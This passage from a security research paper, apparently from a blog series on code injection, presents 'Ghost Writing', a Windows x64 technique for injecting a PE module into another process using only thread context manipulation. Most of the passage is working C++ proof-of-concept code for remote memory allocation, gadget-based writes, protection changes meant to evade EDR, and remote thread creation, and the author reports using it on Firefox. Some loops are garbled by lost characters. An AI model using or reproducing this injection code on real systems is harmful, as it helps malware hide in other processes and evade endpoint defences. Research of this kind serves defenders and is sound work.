(ADDRESS_VALUE)rtManipulation->jmp0GadgetAddr); 
4.3.2. End thread context manipulation 
Here is the signature of the method I defined to clean and restore or terminate cleanly the remote 
thread 
/* 
Will clean when you are finished with context manipulation 
Will terminate created thead or restore hijacked thread 
return TRUE if function succeeds 
*/ 
BOOL MagicThread::EndThreadContextManipulation(PREMOTE_THREAD_CONTEXT_MANIPULATION 
rtManipulation) 
4.3.3. Remote write anywhere 
This method is a wrapper around the write anywhere gadget. In the signature below, the argument 
valueToWrite is copied to addressToWrite in the remote process memory. 
VOID MagicThread::WriteToRemoteThread(PREMOTE_THREAD_CONTEXT_MANIPULATION rtManipulation, 
ULONG_PTR addressToWrite, ADDRESS_VALUE valueToWrite) 
I used a lot WriteToRemoteThread in the POC. One possible usage is to replace Win32 
WriteProcessMemory and instead write the payload 8 bytes by 8 bytes to the remote thread using 
WriteToRemoteThread. 
/* Write processed module image in target process memory */ 
log_info("   [-] Copy modified module in remote process\n"); 
//WriteProcessMemory(hProcess, (LPVOID)distantModuleMemorySpace, moduleCopyBaseAddress, 
moduleSize, NULL); 
ADDRESS_VALUE i; 
for (i = 0; i OptionalHeader.SizeOfHeaders, 
PAGE_READONLY, rmi.jmp0StackAddr + 0X20); 
When you need to call a function with more than 4 parameters, you have to put the additional 
parameters on the stack using WriteToRemoteThread. In the example below we instrument the 
remote threat to call CreateThread. 
// CreateThread require 6 param, we put param 5 and 6 on the stack first 
MagicThread::WriteToRemoteThread(&rmi, rmi.jmp0StackAddr+0x28, 
(ADDRESS_VALUE)CREATE_SUSPENDED); 
MagicThread::WriteToRemoteThread(&rmi, rmi.jmp0StackAddr+0x30, 0); 
ADDRESS_VALUE remoteThreadHandle = MagicThread::TriggerFunctionInRemoteProcess(&rmi, 
"Kernel32.dll", "CreateThread", 0, 0, rmi.jmp0GadgetAddr, 0); 
7 
4.3.5. Integrate into Code injection 
I integrated all these concepts presented above to implement a full PE injection mechanism as 
described in part 1 and part 2.  The code next page is commented and presents every step to allocate 
memory in remote process, copy current Exe module with patched relocation, modify sections 
protections to avoid EDR, and execute the injected code in the remote process using only thread 
context manipulation. 
/** 
 * Inject a PE module in the target process memory, using CONTEXT manipulations 
 * @param targetProcess Handle to target process 
 * @param moduleBaseAddress base address in current process memoryy of PE we want to inject 
 * @return Handle to injected module in target process 
 */ 
HMODULE MagicInjection::InjectViaThreadContext(HANDLE hProcess, LPVOID moduleBaseAddress) 
{ 
    /* Get module PE headers */ 
    PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)((LPBYTE)moduleBaseAddress + 
((PIMAGE_DOS_HEADER)moduleBaseAddress)->e_lfanew); 
    /* Get the size of the code we want to inject */ 
    DWORD moduleSize = headers->OptionalHeader.SizeOfImage; 
    ADDRESS_VALUE distantModuleMemorySpace = NULL; 
    LPBYTE moduleCopyBaseAddress = NULL; 
    DWORD oldProtect = 0; 
    MEMORY_BASIC_INFORMATION info; 
    log_info(" [+] Injecting module via context manipulation...\n"); 
    if (headers->Signature != IMAGE_NT_SIGNATURE) 
        return NULL; 
    /* Check if calculated size really corresponds to module size */ 
    if (IsBadReadPtr(moduleBaseAddress, moduleSize)) 
        return NULL; 
    REMOTE_THREAD_CONTEXT_MANIPULATION rmi = { 0 }; 
    if (MagicThread::InitThreadContextManipulation(hProcess, &rmi, FALSE)) 
    { 
        /* Allocate memory in the target process to contain the injected module image */ 
        log_info("   [-] Allocate memory in remote process\n"); 
        distantModuleMemorySpace = MagicThread::TriggerFunctionInRemoteProcess(&rmi, "Kernel32.dll", 
"VirtualAlloc", 0, (ADDRESS_VALUE)moduleSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); 
        if (distantModuleMemorySpace != NULL) 
        { 
            /* Now we need to modify the current module before we inject it */ 
            /* Allocate some space to process the current PE image in a temporary buffer */ 
            log_info("   [-] Allocate memory in current process\n"); 
            moduleCopyBaseAddress = (LPBYTE)VirtualAlloc(NULL, moduleSize, MEM_RESERVE | MEM_COMMIT, 
PAGE_EXECUTE_READWRITE); 
            if (moduleCopyBaseAddress != NULL) 
            { 
                log_info("   [-] Duplicate module memory in current process\n"); 
                RtlCopyMemory(moduleCopyBaseAddress, moduleBaseAddress, moduleSize); 
log_info("   [-] Patch relocation table in copied module\n"); 
                if (patchRelocationTable(moduleBaseAddress, (LPVOID)distantModuleMemorySpace, 
moduleCopyBaseAddress)) 
             { 
                    ADDRESS_VALUE * copyBase = (ADDRESS_VALUE*)moduleCopyBaseAddress; 
                    /* Write processed module image in target process memory */ 
                    log_info("   [-] Copy modified module in remote process\n"); 
                    //We copy module byte per byte to replace call to WriteProcessMemory 
                 ADDRESS_VALUE i, dotCpt = 0; 
                 for (i = 0; i  Set module header in remote process at %p to READ\n", 
distantModuleMemorySpace); 
                    MagicThread::TriggerFunctionInRemoteProcess(&rmi, "Kernel32.dll", "VirtualProtect", 
distantModuleMemorySpace, (ADDRESS_VALUE)headers->OptionalHeader.SizeOfHeaders, PAGE_READONLY, 
rmi.jmp0StackAddr + 0X20); 
                    // copy over DLL image sections to the newly allocated space for the DLL 
                    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(headers); 
                    for (size_t i = 0; i FileHeader.NumberOfSections; i++) 
                    { 
                        LPVOID sectionDestination = (LPVOID)((DWORD_PTR)distantModuleMemorySpace + 
(DWORD_PTR)section->VirtualAddress); 
                        LPVOID sectionOrigin = (LPVOID)((DWORD_PTR)moduleBaseAddress + 
(DWORD_PTR)section->VirtualAddress); 
                        // Get information about original section 
                        VirtualQuery(sectionOrigin, &info, sizeof(info)); 
                        // Use virtualprotect to use same protection as original section 
                        MagicThread::TriggerFunctionInRemoteProcess(&rmi, "Kernel32.dll", 
"VirtualProtect", (ADDRESS_VALUE)sectionDestination, (ADDRESS_VALUE)section->Misc.VirtualSize, 
info.Protect, rmi.jmp0StackAddr + 0X20); 
                        section++; 
                    } 
                    VirtualFree(moduleCopyBaseAddress, 0, MEM_RELEASE); 
                } 
                log_debug("   [-] Create a thread in the remote process \n");                 
                // CreateThread require 6 param, so we put param 5 and 6 on the stack 
                MagicThread::WriteToRemoteThread(&rmi, rmi.jmp0StackAddr+0x28, 
(ADDRESS_VALUE)CREATE_SUSPENDED); 
                MagicThread::WriteToRemoteThread(&rmi, rmi.jmp0StackAddr+0x30, 0); 
                ADDRESS_VALUE remoteThreadHandle = MagicThread::TriggerFunctionInRemoteProcess(&rmi, 
"Kernel32.dll", "CreateThread", 0, 0, rmi.jmp0GadgetAddr, 0); 
            } 
            MagicThread::TriggerFunctionInRemoteProcess(&rmi, "Kernel32.dll", "VirtualFree", 
(ADDRESS_VALUE)distantModuleMemorySpace, 0, MEM_RELEASE,0); 
            distantModuleMemorySpace = NULL; 
        } 
    } 
    else 
    { 
        log_info("   [!] Failed to initalize for context manipulation.\n"); 
    } 
    MagicThread::EndThreadContextManipulation(&rmi);     
    /* Return base address of copied image in target process */ 
    return (HMODULE)distantModuleMemorySpace; 
} 
9 
5. Example 
5.1. Use ghost writing on Firefox 
Here is a screenshot of DebugView after I inject and deploy hooks inside Firefox using Ghost writing. I 
achieve the same result as in the other code injection series posts, but only using thread context 
manipulation! 
10 
6. Going further 
6.1. Build and improve 
The implementation of the thread related methods described earlier are available at: 
https://github.com/sevagas/MagicLib 
I cannot provide a full Visual Studio solution because it would pull a lot of code that I cannot make 
public. In this paper and POC I only described GhostWriting in x64 architecture, if you are interested 
by 32 bit implementation, it is left as an exercise to the reader... 
Note: I am not a developer, so do not hesitate to send me source code improvement suggestion. 
6.2. Further readings about code injection 
I you want to learn more about code injection I suggest you read the other posts of the Code Injection 
series on https://blog.sevagas.com 
For advanced readers, https://modexp.wordpress.com/ is awesome. The author describes a lot of 
advanced injection/execution techniques and provides proof of concepts. 
On https://tyranidslair.blogspot.com/ you will find great posts about injection and Windows security 
At BlackHat 2019, researchers presented talk called Process Injection Techniques - Gotta Catch Them 
All. It is a compilation of a lot of existing attacks and a Github repo with POC source code is provided. 
You can also follow me on twitter: @EmericNasi